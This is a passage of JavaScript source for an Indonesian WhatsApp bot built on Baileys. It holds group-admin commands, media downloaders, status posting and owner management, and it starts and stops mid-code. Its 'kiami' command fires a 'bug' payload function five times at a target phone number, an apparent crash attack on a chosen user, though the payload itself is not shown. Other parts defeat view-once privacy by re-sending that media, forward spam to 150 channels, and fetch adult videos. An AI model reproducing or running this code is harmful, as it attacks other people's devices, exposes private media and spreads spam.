`${jpmch46}`,
`${jpmch47}`,
`${jpmch48}`,
`${jpmch49}`,
`${jpmch50}`,
`${jpmch51}`,
`${jpmch52}`,
`${jpmch53}`,
`${jpmch54}`,
`${jpmch55}`,
`${jpmch56}`,
`${jpmch57}`,
`${jpmch58}`,
`${jpmch59}`,
`${jpmch60}`,
`${jpmch61}`,
`${jpmch62}`,
`${jpmch63}`,
`${jpmch64}`,
`${jpmch65}`,
`${jpmch66}`,
`${jpmch67}`,
`${jpmch68}`,
`${jpmch69}`,
`${jpmch70}`,
`${jpmch71}`,
`${jpmch72}`,
`${jpmch73}`,
`${jpmch74}`,
`${jpmch75}`,
`${jpmch76}`,
`${jpmch77}`,
`${jpmch78}`,
`${jpmch79}`,
`${jpmch80}`,
`${jpmch81}`,
`${jpmch82}`,
`${jpmch83}`,
`${jpmch84}`,
`${jpmch85}`,
`${jpmch86}`,
`${jpmch87}`,
`${jpmch88}`,
`${jpmch89}`,
`${jpmch90}`,
`${jpmch91}`,
`${jpmch92}`,
`${jpmch93}`,
`${jpmch94}`,
`${jpmch95}`,
`${jpmch96}`,
`${jpmch97}`,
`${jpmch98}`,
`${jpmch99}`,
`${jpmch100}`,
`${jpmch101}`,
`${jpmch102}`,
`${jpmch103}`,
`${jpmch104}`,
`${jpmch105}`,
`${jpmch106}`,
`${jpmch107}`,
`${jpmch108}`,
`${jpmch109}`,
`${jpmch110}`,
`${jpmch111}`,
`${jpmch112}`,
`${jpmch113}`,
`${jpmch114}`,
`${jpmch115}`,
`${jpmch116}`,
`${jpmch117}`,
`${jpmch118}`,
`${jpmch119}`,
`${jpmch120}`,
`${jpmch121}`,
`${jpmch122}`,
`${jpmch123}`,
`${jpmch124}`,
`${jpmch125}`,
`${jpmch126}`,
`${jpmch127}`,
`${jpmch128}`,
`${jpmch129}`,
`${jpmch130}`,
`${jpmch131}`,
`${jpmch132}`,
`${jpmch133}`,
`${jpmch134}`,
`${jpmch135}`,
`${jpmch136}`,
`${jpmch137}`,
`${jpmch138}`,
`${jpmch139}`,
`${jpmch140}`,
`${jpmch141}`,
`${jpmch142}`,
`${jpmch143}`,
`${jpmch144}`,
`${jpmch145}`,
`${jpmch146}`,
`${jpmch147}`,
`${jpmch148}`,
`${jpmch149}`,
`${jpmch150}`,
 ];

for (const idSaluran of daftarSaluran) {
try
{
await Denzy.sendMessage(idSaluran, {
          contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
businessMessageForwardInfo: {
            businessOwnerJid: `${global.owner}` + "@s.whatsapp.net"
          },
        },
        text: text })
} catch (error) {
 console.error(`Gagal mengirim ke saluran ${idSaluran}:`, error); // Log jika gagal
 }
 }
 return m.reply("_*Done Jpm Channel*_");
}
break      
case 'promote': {
if (!m.isGroup) return Reply("Only Grup")
if (!isAdmins && !isDenzyCreator) return Reply('Khusus Admin!!')
if (!isBotAdmins) return Reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Denzy.groupParticipantsUpdate(m.chat, [users], 'promote')
await Reply(`sukses kak`)
}
break
case 'demote': {
if (!m.isGroup) return Reply("Only Grup")
if (!isAdmins && !isDenzyCreator) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Denzy.groupParticipantsUpdate(m.chat, [users], 'demote')
await Reply(`sukses kak`)
}
break
    case 'kick': {
if (!m.isGroup) return Reply("Only Grup")
if (!isAdmins && !isDenzyCreator) return Denzypriv()
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Denzy.groupParticipantsUpdate(m.chat, [users], 'remove')
await Reply(`sukses kak`)
}
break
case "delowner": case "delown": {
if (!isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
if (!m.quoted && !text) return m.reply("6285###")
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return m.reply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./start/lib/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menghapus owner ✅`)
}
break
case 'kiami':
if (!isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
if (!q) return m.reply(`Example : ${prefix + command} 62x`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝘗𝘭𝘦𝘢𝘴𝘦 𝘈 𝘞𝘢𝘪𝘵.....")
     for (let i = 0; i < 5; i++) {
     await ExecAprela(target, Denzy)
     }
reply(`𝘚𝘶𝘤𝘤𝘦𝘴𝘴 𝘚𝘦𝘯𝘥 𝘉𝘶𝘨 𝘛𝘰 _${target}_, 𝘈𝘯𝘥 𝘋𝘰𝘯'𝘵 𝘍𝘰𝘳𝘨𝘦𝘵 𝘛𝘰 𝘗𝘢𝘶𝘴𝘦 𝘍𝘰𝘳 𝘈𝘣𝘰𝘶𝘵 10-20 𝘔𝘪𝘯𝘶𝘵𝘦𝘴 𝘖𝘬𝘦? :)`)
break
case "addowner": case "addown": {
if (!isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
if (!m.quoted && !text) return m.reply("6285###")
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./start/lib/database/owner.json", JSON.stringify(owners, null, 2))
reply(`Berhasil menambah owner ✅`)
}
break
case 'tagsw': {
if (!isPremium) return Denzypriv()
    if (!text) return reply(`Masukkan teks untuk status atau reply gambar/video dengan caption`);
    let media = null;
    let options = {};
    const jids = [m.sender, m.chat];
    if (m.quoted) {
        const mime = m.quoted.mtype || m.quoted.mediaType;
        if (mime.includes('image')) {
            media = await m.quoted.download();
            options = {
                image: media,
                caption: text || m.quoted.text || '',
            };
        } else if (mime.includes('video')) {
            media = await m.quoted.download();
            options = {
                video: media,
                caption: text || m.quoted.text || '',
            };
        } else {
            options = {
                text: text || m.quoted.text || '',
            };
        }
    } else {
        options = {
            text: text,
        };
    }
    return Denzy.sendMessage("status@broadcast", options, {
        backgroundColor: "#7ACAA7",
        textArgb: 0xffffffff,
        font: 1,
        statusJidList: await (await Denzy.groupMetadata(m.chat)).participants.map((a) => a.id),
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: jids.map((jid) => ({
                            tag: "to",
                            attrs: { jid: m.chat },
                            content: undefined,
                        })),
                    },
                ],
            },
        ],
    });
    m.reply("Done Up Tag Sw, Silahkan Cek Sw Sekarang");
}
break
case 'tiktokmp3': case 'ttmp3': {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await Denzy.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await tiktokDl(text).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await Denzy.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
await Denzy.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error"))
}
break
case 'mediafire': {
if (!text) return m.reply(example("linknya"))
if (!text.includes('mediafire.com')) return m.reply("Link tautan tidak valid")
await mediafire(text).then(async (res) => {
if (!res.link) return m.reply("Error! Result Not Found")
await Denzy.sendMessage(m.chat, {document: {url: res.link}, fileName: res.judul, mimetype: "application/"+res.mime.toLowerCase()}, {quoted: m})
}).catch((e) => m.reply("Error"))
}
break
case "muslimai": {
if (!text) return Reply("Mau Nanya Apa Ke MuslimAi")
async function muslimAi(text) {
    try {
        const response = await axios.get(`https://api.siputzx.my.id/api/ai/muslimai?query=${encodeURIComponent(text)}`)
 Reply(`*[ Muslim Ai ]*\n\nPertanyaan: ${text}\n\nJawaban: ${JSON.stringify(response.data.data, null, 2)}`)
    } catch (e) {
        m.reply(e)
    }
}

muslimAi(text)
}
break
case 'jawaai': case 'jawa-ai': {
if (!text) return Reply("Mau Nanya Apa?")
try {
const iamjawa = await axios.get(`https://api.siputzx.my.id/api/ai/joko?content=${encodeURIComponent(text)}`)
Reply(`*[ JAWA AI ]*\n\n${iamjawa.data.data}`)
} catch (e) {
m.reply(e)
}
}
break
case 'instagram': case 'igdl': case 'ig': {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await Denzy.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://api.skyzopedia.us.kg/api/download/igdl?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await Denzy.sendMessage(m.chat, {video: {url: res.result.url}, mimetype: "video/mp4", caption: "*Instagram Downloader ✅*"}, {quoted: m})
await Denzy.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error"))
}
break
case 'pin': case 'pinterest': {
if (!text) return Reply("anime dark")
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
let pin = await pinterest2(text)
if (pin.length > 10) await pin.splice(0, 11)
const txts = text
let araara = new Array()
let urutan = 0
for (let a of pin) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.images_url}`}}, { upload: Denzy.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.images_url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `\nBerikut adalah foto hasil pencarian dari *pinterest*`
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: qkontak})
await Denzy.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
await Denzy.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break
case 'tt': {
if (!text) return m.reply("url")
if (!text.startsWith("https://")) return m.reply("url")
await tiktokDl(q).then(async (result) => {
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
if (!result.status) return m.reply("Error")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: Denzy.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Tiktok Downloader ✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: qkontak})
await Denzy.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await Denzy.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Tiktok Downloader ✅*`}, {quoted: qkontak})
}
}).catch(e => console.log(e))
await Denzy.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break
case 'q': case 'quoted': {
if (!m.quoted) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
let kyaquotx= await Denzy.serializeM(await m.getQuotedObj())
if (!kyaquotx.quoted) return Reply('Pesan yang Anda balas tidak dikirim oleh bot')
await kyaquotx.quoted.copyNForward(m.chat, true)
}
break
case 'owner': {
let name = m.pushName || Denzy.getName(m.sender);
let panduan = `𝘏𝘢𝘪 𝘊𝘢𝘯𝘵𝘪𝘬/𝘎𝘢𝘯𝘵𝘦𝘯𝘨 𝘑𝘢𝘯 𝘓𝘶𝘱𝘢 𝘉𝘢𝘤𝘢 𝘙𝘶𝘭𝘦𝘴 𝘋𝘪 𝘉𝘢𝘸𝘢𝘩 𝘐𝘯𝘪 𝘠𝘢 𝘚𝘦𝘣𝘦𝘭𝘶𝘮 𝘊𝘩𝘢𝘵 𝘖𝘸𝘯𝘦𝘳`

const url = 'https://i.ibb.co/d0XZLt4K/IMG-20250511-002924-317.jpg'
async function image(url) {
  const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: Denzy.waUploadToServer
  });
  return imageMessage;
}
let msg = generateWAMessageFromContent(
  m.chat,
  {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: panduan
          },
          carouselMessage: {
            cards: [
              {                   
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: 'https://i.ibb.co/d0XZLt4K/IMG-20250511-002924-317.jpg' } }, { upload: Denzy.waUploadToServer })),
          title: `> ᴜsᴍᴀɴ ᴄʜᴀᴄʜᴀʀ`,
          gifPlayback: true,
          subtitle: '𝘋𝘌𝘕𝘡𝘠 𝘖𝘍𝘍𝘊',
          hasMediaAttachment: false
        }),
                body: {
                  text: `𝘛𝘩𝘪𝘴 𝘐𝘴 𝘔𝘺 𝘖𝘸𝘯𝘦𝘳, 𝘋𝘰𝘯'𝘵 𝘚𝘱𝘢𝘮 𝘊𝘩𝘢𝘵 𝘖𝘳 𝘊𝘢𝘭𝘭 𝘔𝘺 𝘖𝘸𝘯𝘦𝘳 𝘉𝘵𝘸 ᐛ`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"𝘛𝘩𝘦 𝘊𝘳𝘦𝘢𝘵𝘰𝘳","url":"https://wa.me/6288213993436","merchant_url":"https://www.google.com"}`
                    },
                  ],
                },
              },
            ],
            messageVersion: 1,
          },
        },
      },
    }
  },
  {}
);

await Denzy.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id,
});
}
break
case 'yt': {
let name = m.pushName || Denzy.getName(m.sender);
let panduan = `𝘏𝘢𝘪 𝘊𝘢𝘯𝘵𝘪𝘬/𝘎𝘢𝘯𝘵𝘦𝘯𝘨 𝘑𝘢𝘯 𝘓𝘶𝘱𝘢 𝘚𝘶𝘣𝘴𝘤𝘳𝘪𝘣𝘦 𝘠𝘰𝘶𝘛𝘶𝘣𝘦 𝘖𝘸𝘯𝘦𝘳 𝘠𝘢`

const url = 'https://i.ibb.co/d0XZLt4K/IMG-20250511-002924-317.jpg'
async function image(url) {
  const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: Denzy.waUploadToServer
  });
  return imageMessage;
}
let msg = generateWAMessageFromContent(
  m.chat,
  {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: panduan
          },
          carouselMessage: {
            cards: [
              {                   
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: 'https://i.ibb.co/d0XZLt4K/IMG-20250511-002924-317.jpg' } }, { upload: Denzy.waUploadToServer })),
          title: `> ᴜsᴍᴀɴ ᴄʜᴀᴄʜᴀʀ`,
          gifPlayback: true,
          subtitle: '𝘋𝘌𝘕𝘡𝘠 𝘖𝘍𝘍𝘊',
          hasMediaAttachment: false
        }),
                body: {
                  text: `𝘛𝘩𝘪𝘴 𝘐𝘴 𝘠𝘰𝘶𝘛𝘶𝘣𝘦 𝘔𝘺 𝘖𝘸𝘯𝘦𝘳, 𝘋𝘰𝘯'𝘵 𝘍𝘰𝘳 𝘎𝘦𝘵 𝘛𝘰 𝘚𝘶𝘣𝘴𝘤𝘳𝘪𝘣𝘦 𝘠𝘰𝘶𝘛𝘶𝘣𝘦 𝘔𝘺 𝘖𝘸𝘯𝘦𝘳 𝘉𝘵𝘸 ᐛ`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"𝘠𝘰𝘶𝘛𝘶𝘣𝘦","url":"https://www.youtube.com/@rizeldev","merchant_url":"https://www.google.com"}`
                    },
                  ],
                },
              },
            ],
            messageVersion: 1,
          },
        },
      },
    }
  },
  {}
);

await Denzy.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id,
});
}
break
case "ba":
case "bluearchive": {
if (!isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m});
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
  const anu = `https://restapi-rapixzy.vercel.app/random/ba`;
  const response = await axios.get(anu, { responseType: 'arraybuffer' })
  try {
    Denzy.sendMessage(m.chat, {
      image: Buffer.from(response.data),
      caption: 'Nih Blue Archive Nya Kontol'
    }, { quoted: qkontak })
  } catch (err) {
    console.log(err);
    m.reply('undefined')
  }
}
break
case "waifu":
case "randomwaifu": {
if (!isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m});
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
  const anu = `https://restapi-rapixzy.vercel.app/random/waifu`;
  const response = await axios.get(anu, { responseType: 'arraybuffer' })
  try {
    Denzy.sendMessage(m.chat, {
      image: Buffer.from(response.data),
      caption: 'Nih Waifu Nya Kontol'
    }, { quoted: qkontak })
  } catch (err) {
    console.log(err);
    m.reply('undefined')
  }
}
break
case "cosplay2": {
    if (!isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m});
    await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
    const anu = `https://archive-ui.tanakadomp.biz.id/asupan/cosplay`;
  try {
 const response = await axios.get(anu, { responseType: 'arraybuffer' });
 await Denzy.sendMessage(m.chat, {
 audio: Buffer.from(response.data),
 mimetype: 'audio/ogg; codecs=opus',
ptt: true
 }, { quoted: qkontak });
 console.log('Voice note berhasil dikirim.');
 } catch (err) {
 console.error('Gagal', err);
m.reply('Sorr Eror Cuy');
}
}
break;
case "rvo": {
if (!m.quoted) return Reply(
`*❌Syntax Error!!*
*Example:* Reply ViewOnce with caption ${prefix + command}`);
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
try {
let buffer = await m.quoted.download();
let type = m.quoted.mtype;
let sendOptions = { quoted: m };
if (type === "videoMessage") {
await Denzy.sendMessage(m.chat, { video: buffer, caption: m.quoted.text || "" }, sendOptions);
} else if (type === "imageMessage") {
await Denzy.sendMessage(m.chat, { image: buffer, caption: m.quoted.text || "" }, sendOptions);
} else if (type === "audioMessage") {
await Denzy.sendMessage(m.chat, { 
audio: buffer, 
mimetype: "audio/mpeg", 
ptt: m.quoted.ptt || false 
}, sendOptions);
} else {
return Reply("❌ Media View Once tidak didukung.");
}} catch (err) {
console.error(err)}}
break;
/// main
case 'hentaivid': case 'hentaivideo': {
if (!isPremium && !isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
const { hentai } = require('./lib/function/scraper.js')
anu = await hentai()
result912 = anu[Math.floor(Math.random(), anu.length)]
Denzy.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji}` }, { quoted: qkontak })
            }
            break
case "anime1": {
if (!isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m});
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
  const anu = `https://archive-ui.tanakadomp.biz.id/asupan/anime`;
  const response = await axios.get(anu, { responseType: 'arraybuffer' })
  try {
    Denzy.sendMessage(m.chat, {
      image: Buffer.from(response.data),
      caption: 'Nih AnimeNya Kontol'
    }, { quoted: qkontak })
  } catch (err) {
    console.log(err);
    m.reply('undefined')
  }
}
break
case "Denzy": {
Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ah.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m});
}
break
case "cosplay1": {
if (!isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m});
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
  const anu = `https://archive-ui.tanakadomp.biz.id/asupan/cosplay`;
  const response = await axios.get(anu, { responseType: 'arraybuffer' })
  try {
    Denzy.sendMessage(m.chat, {
      image: Buffer.from(response.data),
      caption: 'Nih CosplayNya Kontol'
    }, { quoted: qkontak })
  } catch (err) {
    console.log(err);
    m.reply('undefined')
  }
}
break
case 'cekidch': case 'idch': {
if (!text) return Reply("linkchnya")
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await Denzy.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
return Reply(teks)
}
break
case 'superhd': case 'tohd': case 'hd': case 'remini': {
if (!/image/.test(mime)) return m.reply("dengan kirim/reply foto")
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
let foto = await Denzy.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(foto), "enhance")
await Denzy.sendMessage(m.chat, {image: result}, {quoted: qkontak})
await fs.unlinkSync(foto)
}
break
case 'upsw': {
    const baileys = require("@whiskeysockets/baileys");

    async function fetchParticipants(...jids) {
        let results = [];
        for (const jid of jids) {
            let { participants } = await Denzy.groupMetadata(jid);
            participants = participants.map(({ id }) => id);
            results = results.concat(participants);
        }
        return results;
    }

    async function mentionStatus(jids, content) {
        const msg = await baileys.generateWAMessage(baileys.STORIES_JID, content, {
            upload: Denzy.waUploadToServer
        });

        let statusJidList = [];
        for (const _jid of jids) {
            if (_jid.endsWith("@g.us")) {
                for (const jid of await fetchParticipants(_jid)) {
                    statusJidList.push(jid);
                }
            } else {
                statusJidList.push(_jid);
            }
        }
        statusJidList = [...new Set(statusJidList)];

        await Denzy.relayMessage(msg.key.remoteJid, msg.message, {
            messageId: msg.key.id,
            statusJidList,
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: jids.map((jid) => ({
                                tag: "to",
                                attrs: { jid },
                                content: undefined
                            }))
                        }
                    ]
                }
            ]
        });

        for (const jid of jids) {
            let type = jid.endsWith("@g.us") ? "groupStatusMentionMessage" : "statusMentionMessage";
            await Denzy.relayMessage(jid, {
                [type]: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            }, {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "true" },
                        content: undefined
                    }
                ]
            });
        }

        return msg;
    }

    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || '';
    let content = {};

    if (mime) {
        let media = await q.download();

        if (/image/.test(mime)) {
            content.image = media;
        } else if (/video/.test(mime)) {
            content.video = media;
        } else if (/audio/.test(mime)) {
            content.audio = media;
        } else {
            return m.reply("Jenis file tidak didukung!");
        }

        if (q.text) content.caption = q.text;
    } else if (args[0]) {
        let url = args[0];
        let type = args[1] || 'text';

        if (type === 'image') {
            content.image = { url };
        } else if (type === 'video') {
            content.video = { url };
        } else if (type === 'audio') {
            content.audio = { url };
        } else {
            content.text = args.slice(1).join(" ") || url;
        }
    } else {
        return m.reply("Reply media atau masukkan URL dengan format:\n.status <url> <image/video/audio/text>");
    }

    mentionStatus([m.chat], content).catch(console.error);
}
break;
case 'smeme': case 'stickermeme': case 'stickmeme': {
if (!/webp/.test(mime) && /image/.test(mime)) {
if (!text) return Reply(`Kirim/Balas Gambar Dengan Caption ${prefix + command}
 text1|text2`)
 await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await Denzy.downloadAndSaveMediaMessage(quoted)
mem = await UploadFileUgu(mee)
meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem.url}`
Denzy.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
memek = await Denzy.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
Denzy.sendMessage(m.chat, { react: { text: '✔️', key: m.key }})
} else {
Reply(`Kirim/Balas Gambar Dengan Caption ${prefix + command}
 text1|text2`)
}
}
break
case "luckynumber": {
 let luckyNumber = Math.floor(Math.random() * 100) + 1;
 m.reply(`🍀 *Angka Keberuntunganmu Hari Ini:* *${luckyNumber}* 🍀`);
};
break;
case 'qc': {
if (!text) return reply(`*Teks Nya Mana Dongo!*`)
Denzy.sendMessage(m.chat, {  text: `Silahkah Pilih *WARNA QC* Yang Tersedia Di Bawah Ini`, 
  footer: foother,
  buttons: [
    {
      buttonId: `.sc`,
      buttonText: { displayText: 'SCRIPT' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'LIST WARNA QC',
          sections: [
            {
              title: 'LIST WARNA QC',
              highlight_label: 'Recommended',
              rows: [
                {
                title: 'pink',
                  id: `.qc2 pink ${text}`
                },
                {
                title: 'biru',
                  id: `.qc2 biru ${text}`
                },
                {
                  title: 'merah',
                  id: `.qc2 merah ${text}`
                },                
                {
                title: 'hijau',
                  id: `.qc2 hijau ${text}`
                },
                {
                  title: 'kuning',
                  id: `.qc2 kuning ${text}`
                },                
                {
                title: 'ungu',
                  id: `.qc2 ungu ${text}`
                },
                {
                  title: 'birutua',
                  id: `.qc2 birutua ${text}`
                },                
                {
                  title: 'birumuda',
                  id: `.qc2 birumuda ${text}`
                },                
                {
                title: 'abu',
                  id: `.qc2 abu ${text}`
                },
                {
                title: 'orangeI',
                  id: `.qc2 orangel ${text}`
                },
                {
                  title: 'hitam',
                  id: `.qc2 hitam ${text}`
                },                
                {
                title: 'putih',
                  id: `.qc2 putih ${text}`
                },
                {
                  title: 'teal',
                  id: `.qc2 teal ${text}`
                },                
                {
                title: 'merahmuda',
                  id: `.qc2 merahmuda ${text}`
                },
                {
                  title: 'cokelat',
                  id: `.qc2 cokelat ${text}`
                },                
                {
                  title: 'salmon',
                  id: `.qc2 salmon ${text}`
                },                
                {
                title: 'magenta',
